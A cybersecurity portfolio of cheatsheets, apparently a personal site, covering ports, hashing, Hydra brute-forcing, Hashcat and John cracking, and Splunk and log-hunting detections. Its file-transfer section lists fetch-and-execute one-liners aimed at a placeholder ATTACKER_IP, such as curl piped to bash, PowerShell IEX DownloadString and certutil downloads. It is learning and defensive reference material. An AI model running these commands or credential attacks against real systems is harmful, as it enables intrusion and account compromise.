docs.title: Executive Summary
docs.text:
Welcome to my cybersecurity fieldbook — a practical portfolio of projects, write-ups, notes, cheatsheets, and lab investigations.

I use this site to document hands-on cybersecurity work: what I built, what I tested, what I investigated, and what I learned. The goal is to show practical ability, clear thinking, and repeatable technical documentation.

docs.text: Section Why It Matters Projects Standalone cybersecurity projects with concrete deliverables Writeups First-hand lab investigations and technical write-ups Defensive Security Detection, monitoring, traffic analysis, and incident response notes Offensive Security Reconnaissance, exploitation, methodology, and tooling notes Cheatsheets Fast operational references for commands, tools, and workflows

docs.title: Current Goal
docs.text:
My current goal is to use this fieldbook as a public portfolio that demonstrates practical cybersecurity skill.

I want each section to show more than notes. The site should show how I approach technical problems, how I validate findings, how I document evidence, and how I improve my work over time.

docs.title: About
docs.text:
I use this site to document practical cybersecurity work: projects, lab investigations, technical notes, and operational cheatsheets.

The goal is to show how I think, how I investigate, and how I document technical work.

docs.title: Executive Summary
docs.text:
Cheatsheets are compact field references for commands, syntax, ports, tools, and investigation shortcuts.

These pages are meant for quick lookup during labs, assessments, analysis, and troubleshooting. They should stay short, practical, and command-focused.

docs.title: Sections
docs.text:
• Core — Common ports, networking references, encoding, and hashing.
  • Operating Systems — Linux, Windows, and PowerShell command references.
  • Reconnaissance — Nmap, DNS, subdomains, and OSINT.
  • Web — Burp Suite, web requests, and SQLMap.
  • Exploitation — Metasploit, shells, file transfers, and tunneling.
  • Credentials — Hydra and password cracking references.
  • Defensive — Log hunting, Splunk queries, and detection quick references.

docs.title: Usage Notes
docs.text:
• Replace placeholder values such as TARGET_IP, DOMAIN, USERNAME, and PORT.
  • Validate commands in a lab before using them in a real environment.
  • Prefer safe, authorized, and documented testing workflows.
  • Keep commands updated as tools and syntax change.

docs.title: Executive Summary
docs.text:
Common ports help quickly identify likely services during scanning, enumeration, traffic analysis, and log review.

Use this page as a fast reference when reviewing Nmap results, firewall logs, packet captures, or SIEM events.

docs.title: Quick Scan Examples
docs.text:
Top ports:

nmap --top-ports 100 TARGET_IP

Service detection:

nmap -sV -sC TARGET_IP

All TCP ports:

nmap -p- --min-rate 1000 TARGET_IP

Common UDP scan:

sudo nmap -sU --top-ports 100 TARGET_IP

docs.title: Notes
docs.text:
• Open ports do not always mean exploitable services.
  • Closed ports may still be useful for firewall mapping.
  • Filtered ports suggest packet filtering, firewalls, or dropped traffic.
  • Always pair port discovery with service/version detection.

docs.title: Executive Summary
docs.text:
Encoding transforms data into another representation. Hashing produces a fixed-length fingerprint of data. Encryption protects data with a key.

This cheatsheet is for quick lookup when handling files, payloads, hashes, certificates, tokens, and encoded strings.

docs.title: Encoding vs Hashing vs Encryption
docs.text: Concept Reversible Key Required Common Use Encoding Yes No Data formatting and transport Hashing No No Integrity checks and password storage Encryption Yes Yes Confidentiality

docs.title: Base64
docs.text:
Encode a file:

base64 file.bin > file.b64

Encode without line wrapping:

base64 -w 0 file.bin

Decode:

base64 -d file.b64 > file.bin

Encode a string:

echo -n "text" | base64

Decode a string:

echo "dGV4dA==" | base64 -d

PowerShell encode:

[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("text"))

PowerShell decode:

[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("dGV4dA=="))

docs.title: Hex
docs.text:
String to hex:

echo -n "text" | xxd -p

Hex to string:

echo "74657874" | xxd -r -p

Hex dump a file:

xxd file.bin

docs.title: URL Encoding
docs.text:
URL encode with Python:

python3 -c 'import urllib.parse; print(urllib.parse.quote("admin@test.com"))'

URL decode with Python:

python3 -c 'import urllib.parse; print(urllib.parse.unquote("admin%40test.com"))'

Common characters:

Character Encoded Space %20 " %22 # %23 % %25 & %26 ' %27 / %2F : %3A = %3D ? %3F @ %40

docs.title: Hashing Files
docs.text:
MD5:

md5sum file.bin

SHA1:

sha1sum file.bin

SHA256:

sha256sum file.bin

SHA512:

sha512sum file.bin

PowerShell hash:

Get-FileHash .\file.bin -Algorithm SHA256

docs.title: Hashing Strings
docs.text:
MD5:

echo -n "password" | md5sum

SHA256:

echo -n "password" | sha256sum

Python SHA256:

python3 -c 'import hashlib; print(hashlib.sha256(b"password").hexdigest())'

docs.title: Identify Hash Lengths
docs.text: Hash Hex Length MD5 32 SHA1 40 SHA256 64 SHA512 128 NTLM 32 bcrypt Variable, often starts with $2a$, $2b$, or $2y$ SHA-crypt Starts with $5$ or $6$

docs.title: Common Password Hash Indicators
docs.text: Format Meaning $1$ MD5-crypt $2a$, $2b$, $2y$ bcrypt $5$ SHA256-crypt $6$ SHA512-crypt $krb5asrep$ Kerberos AS-REP hash $krb5tgs$ Kerberos TGS hash aad3b435b51404eeaad3b435b51404ee Empty LM hash 32 hex chars Could be MD5 or NTLM

docs.title: OpenSSL Encryption
docs.text:
Encrypt file:

openssl enc -aes256 -pbkdf2 -iter 100000 -in file.txt -out file.enc

Decrypt file:

openssl enc -d -aes256 -pbkdf2 -iter 100000 -in file.enc -out file.txt

Generate random bytes:

openssl rand -hex 16

Generate random base64:

openssl rand -base64 32

docs.title: Certificates
docs.text:
View certificate details:

openssl x509 -in cert.pem -text -noout

Check remote TLS certificate:

openssl s_client -connect example.com:443

Show certificate dates:

echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates

Show certificate subject:

echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -subject -issuer

docs.title: JWT Quick Checks
docs.text:
JWTs usually have three dot-separated parts:

header.payload.signature

Decode JWT header:

echo 'HEADER_PART' | base64 -d

Decode JWT payload:

echo 'PAYLOAD_PART' | base64 -d

If padding is missing, add = characters until decoding works.

docs.title: File Integrity Workflow
docs.text: Step Command Hash original sha256sum file.bin Transfer file Use chosen transfer method Hash received copy sha256sum file.bin Compare hashes Hashes should match exactly

docs.title: Notes
docs.text:
• Base64 is not encryption.
  • Hashes are not reversible.
  • Fast hashes like MD5 and SHA1 are weak for password storage.
  • Use SHA256 or stronger for integrity checks.
  • Use authenticated encryption or trusted secure transfer methods for sensitive data.

docs.title: Executive Summary
docs.text:
This cheatsheet is a quick reference for IP addressing, routing, DNS, connectivity checks, and packet inspection.

Use it when troubleshooting network reachability, reviewing scan results, or validating basic connectivity during labs and assessments.

docs.title: Linux Network Commands
docs.text:
Show interfaces:

ip addr

Show routes:

ip route

Show listening ports:

ss -tulpen

Show ARP/neighbor table:

ip neigh

Test connectivity:

ping -c 4 TARGET_IP

Trace route:

traceroute TARGET_IP

Check DNS resolution:

dig example.com

nslookup example.com

docs.title: Windows Network Commands
docs.text:
Show IP configuration:

ipconfig /all

Show routing table:

route print

Show ARP table:

arp -a

Show active connections:

netstat -ano

Show DNS cache:

ipconfig /displaydns

Test connectivity:

ping TARGET_IP

Trace route:

tracert TARGET_IP

PowerShell port test:

Test-NetConnection TARGET_IP -Port PORT

docs.title: DNS Commands
docs.text:
Query A record:

dig example.com A

Query MX record:

dig example.com MX

Query TXT record:

dig example.com TXT

Query name servers:

dig example.com NS

Reverse lookup:

dig -x TARGET_IP

Attempt zone transfer:

dig axfr @NAMESERVER example.com

docs.title: Netcat Connectivity Checks
docs.text:
Check TCP port:

nc -zv TARGET_IP PORT

Connect to service:

nc TARGET_IP PORT

Listen on port:

nc -lvnp PORT

Send text over TCP:

echo "test" | nc TARGET_IP PORT

docs.title: Tcpdump Quick Reference
docs.text:
Capture traffic on interface:

sudo tcpdump -i INTERFACE

Capture host traffic:

sudo tcpdump -i INTERFACE host TARGET_IP

Capture port traffic:

sudo tcpdump -i INTERFACE port PORT

Capture to file:

sudo tcpdump -i INTERFACE -w capture.pcap

Read capture file:

tcpdump -r capture.pcap

docs.title: Useful Filters
docs.text: Filter Purpose host TARGET_IP Traffic to or from host src TARGET_IP Source IP only dst TARGET_IP Destination IP only port 80 Traffic using port 80 tcp TCP traffic udp UDP traffic icmp ICMP traffic net 192.168.1.0/24 Traffic for subnet

docs.title: Troubleshooting Flow
docs.text: Step Check Interface Does the host have an IP address? Route Is there a route to the destination? DNS Does the hostname resolve? ICMP Does ping work? TCP/UDP Is the target port reachable? Firewall Is traffic filtered or blocked? Service Is the service actually listening?

docs.title: Notes
docs.text:
• ICMP may be blocked even when services are reachable.
  • DNS success does not guarantee the service is alive.
  • A filtered port usually means traffic is being dropped.
  • A refused connection usually means the host is reachable but the port is closed.
  • Always check both local host routing and remote service availability.

docs.title: Executive Summary
docs.text:
Hydra is an online password attack tool used to test username and password combinations against network services.

Use this cheatsheet for quick syntax in authorized labs and assessments.

docs.title: Basic Syntax
docs.text:
Single username and password list:

hydra -l USERNAME -P passwords.txt TARGET_IP SERVICE

Username list and single password:

hydra -L users.txt -p PASSWORD TARGET_IP SERVICE

Username list and password list:

hydra -L users.txt -P passwords.txt TARGET_IP SERVICE

Specify port:

hydra -L users.txt -P passwords.txt TARGET_IP -s PORT SERVICE

docs.title: Common Services
docs.text:
SSH:

hydra -L users.txt -P passwords.txt ssh://TARGET_IP

FTP:

hydra -L users.txt -P passwords.txt ftp://TARGET_IP

RDP:

hydra -L users.txt -P passwords.txt rdp://TARGET_IP

SMB:

hydra -L users.txt -P passwords.txt smb://TARGET_IP

Telnet:

hydra -L users.txt -P passwords.txt telnet://TARGET_IP

VNC:

hydra -P passwords.txt vnc://TARGET_IP

docs.title: HTTP Basic Auth
docs.text:
hydra -L users.txt -P passwords.txt TARGET_IP http-get /protected/

HTTPS Basic Auth:

hydra -L users.txt -P passwords.txt TARGET_IP https-get /protected/

docs.title: HTTP Forms
docs.text:
Basic POST form:

hydra -L users.txt -P passwords.txt TARGET_IP http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

HTTPS POST form:

hydra -L users.txt -P passwords.txt TARGET_IP https-post-form "/login:username=^USER^&password=^PASS^:Invalid"

With cookie:

hydra -L users.txt -P passwords.txt TARGET_IP http-post-form "/login:username=^USER^&password=^PASS^:Invalid:H=Cookie: session=VALUE"

docs.title: Form Syntax
docs.text:
/path:parameters:failure_condition

Example:

/login:username=^USER^&password=^PASS^:Invalid password
Part Meaning /login Login path username=^USER^ Username injection point password=^PASS^ Password injection point Invalid password Text that means login failed

docs.title: Useful Options
docs.text: Option Purpose -l Single username -L Username list -p Single password -P Password list -s Custom port -t Number of parallel tasks -f Stop after first valid credential -F Stop entire scan after first valid credential -V Verbose attempts -I Ignore restore file warning -o Save output

docs.title: Rate Control
docs.text:
Lower task count:

hydra -L users.txt -P passwords.txt -t 4 ssh://TARGET_IP

Stop after first valid result:

hydra -L users.txt -P passwords.txt -f ssh://TARGET_IP

Save output:

hydra -L users.txt -P passwords.txt -o hydra-results.txt ssh://TARGET_IP

docs.title: Username and Password Lists
docs.text:
Single known user:

hydra -l admin -P passwords.txt ssh://TARGET_IP

Password spraying style:

hydra -L users.txt -p "Password123!" ssh://TARGET_IP

Default credentials:

hydra -C default-creds.txt ssh://TARGET_IP

Credential pair file format:

username:password

docs.title: Practical Workflow
docs.text: Step Action Identify service Confirm port and protocol Build user list Use known or discovered usernames Choose password strategy Wordlist, default creds, or single spray password Control rate Use lower -t to avoid lockouts Run Hydra Test only authorized targets Validate result Manually confirm valid credentials Document Save command and output

docs.title: Notes
docs.text:
• Online password attacks can lock accounts.
  • Use low rates when testing real environments.
  • Always understand password policy before spraying.
  • Confirm valid credentials manually.
  • Do not run Hydra outside authorized systems.

docs.title: Executive Summary
docs.text:
Password cracking is used to recover plaintext passwords from captured hashes in authorized labs and assessments.

Use this cheatsheet for quick Hashcat and John the Ripper syntax, hash identification, wordlists, and rule-based cracking.

docs.title: Common Hash Indicators
docs.text: Format Possible Type 32 hex chars MD5 or NTLM 40 hex chars SHA1 64 hex chars SHA256 128 hex chars SHA512 $1$ MD5-crypt $2a$, $2b$, $2y$ bcrypt $5$ SHA256-crypt $6$ SHA512-crypt $krb5asrep$ Kerberos AS-REP $krb5tgs$ Kerberos TGS aad3b435b51404eeaad3b435b51404ee Empty LM hash

docs.title: Hashcat Basics
docs.text:
Show help:

hashcat --help

List example hashes:

hashcat --example-hashes

Benchmark:

hashcat -b

Crack with wordlist:

hashcat -m HASH_MODE -a 0 hashes.txt wordlist.txt

Show cracked hashes:

hashcat -m HASH_MODE hashes.txt --show

Remove cracked hashes:

hashcat -m HASH_MODE hashes.txt --left

docs.title: Common Hashcat Modes
docs.text: Mode Hash Type 0 MD5 100 SHA1 1400 SHA256 1700 SHA512 1000 NTLM 3000 LM 3200 bcrypt 500 MD5-crypt 7400 SHA256-crypt 1800 SHA512-crypt 13100 Kerberos 5 TGS-REP 18200 Kerberos 5 AS-REP

docs.title: Hashcat Attack Modes
docs.text: Mode Type 0 Straight wordlist 1 Combination 3 Brute force / mask 6 Wordlist + mask 7 Mask + wordlist

docs.title: Wordlist Attack
docs.text:
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt

With rules:

hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

docs.title: Mask Attack
docs.text:
Eight lowercase letters:

hashcat -m 1000 -a 3 hashes.txt ?l?l?l?l?l?l?l?l

Password pattern with year:

hashcat -m 1000 -a 3 hashes.txt Company?d?d?d?d

Common masks:

Mask Meaning ?l Lowercase letter ?u Uppercase letter ?d Digit ?s Symbol ?a All printable characters ?1 Custom charset

Custom charset:

hashcat -m 1000 -a 3 hashes.txt -1 ?l?d ?1?1?1?1?1?1

docs.title: John the Ripper Basics
docs.text:
Crack with wordlist:

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

Show cracked passwords:

john hashes.txt --show

Use format:

john hashes.txt --format=NT

Use rules:

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules

docs.title: John Common Formats
docs.text: Format Use NT NTLM raw-md5 MD5 raw-sha1 SHA1 raw-sha256 SHA256 raw-sha512 SHA512 bcrypt bcrypt krb5tgs Kerberos TGS krb5asrep Kerberos AS-REP

docs.title: Archive and File Hash Extraction
docs.text:
ZIP:

zip2john file.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

RAR:

rar2john file.rar > rar.hash
john rar.hash --wordlist=/usr/share/wordlists/rockyou.txt

SSH private key:

ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt

KeePass:

keepass2john database.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt

docs.title: Wordlists
docs.text:
Common locations:

/usr/share/wordlists/
/usr/share/seclists/Passwords/
/usr/share/seclists/Usernames/

RockYou:

gunzip /usr/share/wordlists/rockyou.txt.gz

docs.title: Practical Workflow
docs.text: Step Action Identify hash Check format and length Choose tool Hashcat for speed, John for flexibility Select mode Match hash type Start wordlist attack Use known or common wordlists Add rules Try mutations and common patterns Try masks Use target-specific patterns Show results Export cracked credentials Validate safely Confirm only where authorized

docs.title: Notes
docs.text:
• Hash type identification can be ambiguous.
  • NTLM and MD5 are both 32 hex characters.
  • Rules are often more effective than pure brute force.
  • Target-specific wordlists usually outperform generic lists.
  • Never crack or use hashes outside authorized environments.

docs.text:
This cheatsheet summarizes high-signal defensive patterns for quickly spotting suspicious activity across endpoints, identity, network, web, DNS, and file transfer logs.

Use it as a fast triage reference when reviewing alerts or building detections.

docs.title: Network Signals
docs.text: Signal Possible Meaning Internal port scanning Discovery or lateral movement Workstation to many hosts Reconnaissance Server browsing internet Suspicious outbound activity Direct IP web traffic Payload download or C2 Long-lived external connection Beacon or tunnel Unusual outbound port Exfiltration or tunnel SMB between workstations Lateral movement

docs.title: Persistence Signals
docs.text: Mechanism What to Watch Run keys New values in Run or RunOnce Services New service creation Scheduled tasks New or modified tasks Startup folders New files WMI persistence New event filters/consumers Cron New or modified cron entries Systemd New service files SSH keys New authorized keys

docs.title: Quick Triage Workflow
docs.text: Step Action Identify alert source Endpoint, network, identity, web, DNS Confirm host and user Determine ownership and role Review timeline Look 15–60 minutes before and after Check process chain Parent, child, command line Check network Destinations, ports, DNS, User-Agent Check files Created, modified, executed files Scope Same user, same file hash, same destination Decide Benign, suspicious, confirmed incident

docs.title: Notes
docs.text:
• Strong detections combine multiple signals.
  • Command line plus parent process is more useful than process name alone.
  • Rare behavior from a sensitive host is higher priority.
  • A single failed login is usually noise; patterns matter.
  • Always compare behavior against the host’s normal role.

docs.title: Executive Summary
docs.text:
Log hunting is the process of reviewing security telemetry to identify suspicious behavior, validate alerts, and investigate incidents.

Use this cheatsheet for quick ideas on what to look for across Windows, Linux, web, DNS, proxy, firewall, and endpoint logs.

docs.title: Core Hunting Questions
docs.text: Question Purpose Who performed the action? Identify user or account What process ran? Understand execution When did it happen? Build timeline Where did it happen? Identify host and location What changed? Find impact What connected? Identify network activity What happened next? Determine follow-on activity

docs.title: High-Value Log Sources
docs.text: Source Useful For Windows Security logs Logons, privilege use, account activity Sysmon Process creation, network connections, file writes PowerShell logs Script execution and suspicious commands Linux auth logs SSH, sudo, failed logins Web server logs Web attacks and suspicious requests DNS logs Malware callbacks, tunneling, unusual domains Proxy logs Downloads, User-Agents, web destinations Firewall logs Allowed/blocked traffic EDR logs Process, file, registry, and network telemetry Cloud logs Identity, API, and resource activity

docs.title: Windows Event IDs
docs.text: Event ID Meaning 4624 Successful logon 4625 Failed logon 4634 Logoff 4648 Explicit credentials used 4672 Special privileges assigned 4688 Process creation 4697 Service installed 4720 User account created 4722 User account enabled 4728 User added to privileged group 4732 User added to local group 4740 Account locked out 4768 Kerberos TGT requested 4769 Kerberos service ticket requested 4771 Kerberos pre-authentication failed 7045 Service installed

docs.title: Logon Types
docs.text: Type Meaning 2 Interactive logon 3 Network logon 4 Batch logon 5 Service logon 7 Unlock 10 Remote interactive / RDP 11 Cached interactive

docs.title: Windows Process Hunting
docs.text:
Look for:

  • Office spawning shells.
  • Browsers spawning command interpreters.
  • PowerShell downloading content.
  • certutil contacting external hosts.
  • rundll32 loading unusual DLLs.
  • regsvr32 reaching the network.
  • mshta executing remote content.
  • wscript or cscript running suspicious scripts.
  • Services created from unusual paths.
  • Executables launched from temp directories.

Suspicious parent-child examples:

winword.exe -> powershell.exe
excel.exe -> cmd.exe
w3wp.exe -> cmd.exe
powershell.exe -> rundll32.exe
cmd.exe -> certutil.exe

docs.title: Linux Log Hunting
docs.text:
Common logs:

/var/log/auth.log
/var/log/syslog
/var/log/secure
/var/log/audit/audit.log
/var/log/nginx/access.log
/var/log/apache2/access.log

Useful searches:

grep -i "failed password" /var/log/auth.log

grep -i "accepted password" /var/log/auth.log

grep -i "sudo" /var/log/auth.log

grep -i "session opened" /var/log/auth.log

Look for:

  • Failed SSH bursts.
  • Successful login after many failures.
  • New sudo activity.
  • New users or groups.
  • Commands run from /tmp or /dev/shm.
  • Suspicious cron jobs.
  • Unexpected listening ports.
  • Web server spawning shells.

docs.title: Web Log Hunting
docs.text:
Common suspicious patterns:

Pattern Possible Meaning ../ Path traversal %2e%2e%2f Encoded path traversal ' OR '1'='1 SQL injection attempt <script> XSS attempt cmd= Command execution testing wp-login.php WordPress login targeting /.env Config file discovery /phpmyadmin Admin tool discovery union select SQL injection ../../etc/passwd Linux file read attempt

Useful commands:

grep -Ei "union|select|sleep|benchmark" access.log

grep -Ei "\.\./|%2e%2e%2f|etc/passwd" access.log

grep -Ei "wp-login|xmlrpc|phpmyadmin|\.env" access.log

docs.title: DNS Hunting
docs.text:
Look for:

  • Long random subdomains.
  • High query volume from one host.
  • Rare domains.
  • Newly registered domains.
  • Repeated NXDOMAIN responses.
  • DNS queries to dynamic DNS providers.
  • TXT record abuse.
  • Domains that match malware indicators.

Suspicious examples:

asdj129asd9as.example.com
a1b2c3d4e5f6.bad-domain.tld

docs.title: Proxy and Web Traffic Hunting
docs.text:
Look for:

  • Direct IP downloads.
  • Rare User-Agent strings.
  • Command-line tool User-Agents.
  • Large outbound uploads.
  • Downloads of executables or scripts.
  • Access to file-sharing sites from servers.
  • Connections to newly registered domains.
  • Repeated blocked requests.

Suspicious User-Agents:

WindowsPowerShell
Microsoft-CryptoAPI
Microsoft BITS
curl
Wget
python-requests
WinHttp.WinHttpRequest

docs.title: Firewall Hunting
docs.text:
Look for:

  • Denied outbound connections.
  • New listening services.
  • Workstations connecting to server management ports.
  • Servers browsing the internet.
  • Internal scanning patterns.
  • Repeated connection attempts to many ports.
  • Connections to known bad IPs.
  • Unusual geographic destinations.

docs.title: Timeline Building
docs.text:
Useful fields:

Field Purpose Timestamp Order events Hostname Identify affected system User Identify account Process Identify activity Command line Understand intent Source IP Identify origin Destination IP Identify target File path Identify artifacts Hash Correlate files Event ID Classify activity

docs.title: Investigation Workflow
docs.text: Step Action Start with alert Identify the triggering event Validate Confirm whether behavior is expected Scope host Review nearby process, network, and file events Scope user Check logons and activity across hosts Scope network Review destination IPs, domains, and ports Build timeline Order key events Identify impact Determine what changed or executed Document Save queries, evidence, and findings

docs.title: Notes
docs.text:
• One event rarely tells the whole story.
  • Process ancestry is often more useful than process name alone.
  • Combine endpoint, DNS, proxy, and authentication logs.
  • Compare behavior against the normal role of the host.
  • Servers browsing the internet directly are often high-signal.

docs.title: Executive Summary
docs.text:
This cheatsheet contains quick Splunk SPL patterns for searching logs, filtering events, building timelines, and hunting suspicious activity.

Use these as starting points and adjust index, sourcetype, field names, and time ranges for your environment.

docs.title: Basic Search
docs.text:
Search an index:

index=main

Search with keyword:

index=main "powershell"

Search by host:

index=main host="HOSTNAME"

Search by source type:

index=main sourcetype="WinEventLog:Security"

Search last 24 hours:

index=main earliest=-24h

docs.title: Useful SPL Commands
docs.text: Command Purpose table Display selected fields stats Aggregate results sort Sort results dedup Remove duplicates rename Rename fields eval Create calculated fields where Filter with expressions rex Extract fields with regex lookup Enrich with lookup data transaction Group related events timechart Create time-based aggregation

docs.title: Field Display
docs.text:
Show selected fields:

index=main
| table _time host user process command_line

Sort newest first:

index=main
| sort - _time

Remove duplicate commands:

index=main
| dedup command_line

docs.title: Statistics
docs.text:
Count by host:

index=main
| stats count by host

Count by user and host:

index=main
| stats count by user host

Top source IPs:

index=main
| top src_ip

Rare processes:

index=main process_name=*
| rare process_name

docs.title: Windows Logons
docs.text:
Successful logons:

index=main sourcetype="WinEventLog:Security" EventCode=4624
| table _time host Account_Name Logon_Type IpAddress

Failed logons:

index=main sourcetype="WinEventLog:Security" EventCode=4625
| table _time host Account_Name Failure_Reason IpAddress

RDP logons:

index=main sourcetype="WinEventLog:Security" EventCode=4624 Logon_Type=10
| table _time host Account_Name IpAddress

Explicit credentials used:

index=main sourcetype="WinEventLog:Security" EventCode=4648
| table _time host Account_Name Target_Server_Name Process_Name

docs.title: Windows Process Creation
docs.text:
Process creation:

index=main sourcetype="WinEventLog:Security" EventCode=4688
| table _time host Account_Name New_Process_Name Command_Line Parent_Process_Name

PowerShell execution:

index=main EventCode=4688 New_Process_Name="*powershell*"
| table _time host Account_Name Command_Line Parent_Process_Name

Suspicious download commands:

index=main EventCode=4688
(Command_Line="*Invoke-WebRequest*" OR Command_Line="*DownloadString*" OR Command_Line="*DownloadFile*" OR Command_Line="*WebClient*")
| table _time host Account_Name New_Process_Name Command_Line

Certutil download behavior:

index=main EventCode=4688 New_Process_Name="*certutil*"
(Command_Line="*urlcache*" OR Command_Line="*decode*" OR Command_Line="*http*")
| table _time host Account_Name Command_Line

docs.title: Suspicious Parent-Child Processes
docs.text:
Office spawning shell:

index=main EventCode=4688
(Parent_Process_Name="*winword.exe" OR Parent_Process_Name="*excel.exe" OR Parent_Process_Name="*powerpnt.exe")
(New_Process_Name="*cmd.exe" OR New_Process_Name="*powershell.exe" OR New_Process_Name="*wscript.exe" OR New_Process_Name="*cscript.exe")
| table _time host Account_Name Parent_Process_Name New_Process_Name Command_Line

Web server spawning shell:

index=main EventCode=4688
(Parent_Process_Name="*w3wp.exe" OR Parent_Process_Name="*httpd.exe" OR Parent_Process_Name="*nginx.exe" OR Parent_Process_Name="*apache*")
(New_Process_Name="*cmd.exe" OR New_Process_Name="*powershell.exe" OR New_Process_Name="*/bin/sh*" OR New_Process_Name="*/bin/bash*")
| table _time host Parent_Process_Name New_Process_Name Command_Line

docs.title: Services and Scheduled Tasks
docs.text:
Service installed:

index=main (EventCode=7045 OR EventCode=4697)
| table _time host Service_Name Service_File_Name Account_Name

Scheduled task created:

index=main EventCode=4698
| table _time host Account_Name Task_Name Task_Content

Scheduled task deleted:

index=main EventCode=4699
| table _time host Account_Name Task_Name

docs.title: PowerShell Logs
docs.text:
PowerShell script block logging:

index=main sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104
| table _time host User ScriptBlockText

Suspicious PowerShell keywords:

index=main EventCode=4104
(ScriptBlockText="*IEX*" OR ScriptBlockText="*Invoke-Expression*" OR ScriptBlockText="*DownloadString*" OR ScriptBlockText="*FromBase64String*")
| table _time host User ScriptBlockText

docs.title: Network Hunting
docs.text:
Outbound connections by process:

index=main dest_ip=* dest_port=*
| stats count by host process_name dest_ip dest_port
| sort - count

Rare external destinations:

index=main dest_ip=*
| stats count by dest_ip
| where count < 5

Direct IP web requests:

index=proxy url="http://*"
| regex url="https?://\d{1,3}(\.\d{1,3}){3}"
| table _time src_ip user url user_agent

Suspicious User-Agents:

index=proxy
(user_agent="*WindowsPowerShell*" OR user_agent="*Microsoft-CryptoAPI*" OR user_agent="*Microsoft BITS*" OR user_agent="*curl*" OR user_agent="*Wget*" OR user_agent="*python-requests*")
| table _time src_ip user url user_agent

docs.title: DNS Hunting
docs.text:
Top queried domains:

index=dns query=*
| top query

NXDOMAIN volume:

index=dns response_code="NXDOMAIN"
| stats count by src_ip
| sort - count

Long DNS queries:

index=dns query=*
| eval query_length=len(query)
| where query_length > 80
| table _time src_ip query query_length

Rare domains:

index=dns query=*
| stats count by query
| where count < 3
| sort count

docs.title: Web Attack Hunting
docs.text:
Path traversal:

index=web
(uri="*../*" OR uri="*%2e%2e%2f*" OR uri="*..%2f*")
| table _time src_ip status uri user_agent

SQL injection patterns:

index=web
(uri="*union*select*" OR uri="*sleep(*" OR uri="*benchmark(*" OR uri="*' OR '1'='1*")
| table _time src_ip status uri user_agent

Common exposed files:

index=web
(uri="*/.env*" OR uri="*/config*" OR uri="*/backup*" OR uri="*/phpinfo.php*" OR uri="*/.git/*")
| table _time src_ip status uri user_agent

docs.title: Timeline Building
docs.text:
Timeline by host:

index=main host="HOSTNAME"
| table _time sourcetype EventCode user process command_line src_ip dest_ip
| sort _time

Timeline by user:

index=main user="USERNAME"
| table _time host sourcetype EventCode process command_line src_ip dest_ip
| sort _time

docs.title: Notes
docs.text:
• Replace index=main with the correct index.
  • Field names vary by data source and parser.
  • Use table early while testing, then optimize later.
  • Always validate query results with raw events.
  • Tune detections to your environment before alerting.

docs.title: Executive Summary
docs.text:
File transfer commands are used to move tools, payloads, scripts, evidence, and results between systems.

Use this cheatsheet for quick download, upload, and transfer syntax across Linux, Windows, HTTP, SMB, FTP, SCP, Netcat, and Base64.

docs.title: HTTP Server
docs.text:
Start Python HTTP server:

python3 -m http.server 8000

Python 2:

python2 -m SimpleHTTPServer 8000

PHP server:

php -S 0.0.0.0:8000

Ruby server:

ruby -run -ehttpd . -p8000

docs.title: Linux Downloads
docs.text:
Download with wget:

wget http://ATTACKER_IP:8000/file -O /tmp/file

Download with curl:

curl -o /tmp/file http://ATTACKER_IP:8000/file

Keep original filename:

curl -O http://ATTACKER_IP:8000/file

Fileless execution with curl:

curl http://ATTACKER_IP:8000/script.sh | bash

Fileless execution with wget:

wget -qO- http://ATTACKER_IP:8000/script.sh | bash

docs.title: Windows Downloads
docs.text:
PowerShell download:

Invoke-WebRequest http://ATTACKER_IP:8000/file.exe -OutFile C:\Users\Public\file.exe

PowerShell WebClient:

(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP:8000/file.exe", "C:\Users\Public\file.exe")

PowerShell download string:

IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER_IP:8000/script.ps1")

Certutil download:

certutil -urlcache -split -f http://ATTACKER_IP:8000/file.exe file.exe

BITS download:

Start-BitsTransfer -Source "http://ATTACKER_IP:8000/file.exe" -Destination "C:\Users\Public\file.exe"

docs.title: SMB Transfers
docs.text:
Start SMB server:

sudo impacket-smbserver share /tmp/smbshare -smb2support

Start SMB server with credentials:

sudo impacket-smbserver share /tmp/smbshare -smb2support -user test -password test

Copy from SMB share:

copy \\ATTACKER_IP\share\file.exe C:\Users\Public\file.exe

Map SMB drive:

net use Z: \\ATTACKER_IP\share /user:test test

Copy from mapped drive:

copy Z:\file.exe C:\Users\Public\file.exe

Copy to SMB share:

copy C:\Users\Public\result.txt Z:\

docs.title: FTP Transfers
docs.text:
Start FTP server:

sudo python3 -m pyftpdlib --port 21

Start FTP server with upload support:

sudo python3 -m pyftpdlib --port 21 --write

Windows FTP download with PowerShell:

(New-Object Net.WebClient).DownloadFile("ftp://ATTACKER_IP/file.txt", "C:\Users\Public\file.txt")

Windows FTP upload with PowerShell:

(New-Object Net.WebClient).UploadFile("ftp://ATTACKER_IP/file.txt", "C:\Users\Public\file.txt")

docs.title: SCP Transfers
docs.text:
Download from remote host:

scp user@REMOTE_IP:/path/file .

Upload to remote host:

scp file user@REMOTE_IP:/tmp/

Recursive copy:

scp -r directory user@REMOTE_IP:/tmp/

Specify SSH key:

scp -i key.pem file user@REMOTE_IP:/tmp/

docs.title: Netcat Transfers
docs.text:
Receiver:

nc -lvnp 9001 > file.out

Sender:

nc TARGET_IP 9001 < file.in

Ncat receiver:

ncat -l -p 9001 --recv-only > file.out

Ncat sender:

ncat TARGET_IP 9001 --send-only < file.in

docs.title: Base64 Transfers
docs.text:
Encode file:

base64 -w 0 file.bin

Decode on Linux:

echo "BASE64_STRING" | base64 -d > file.bin

Decode on Windows:

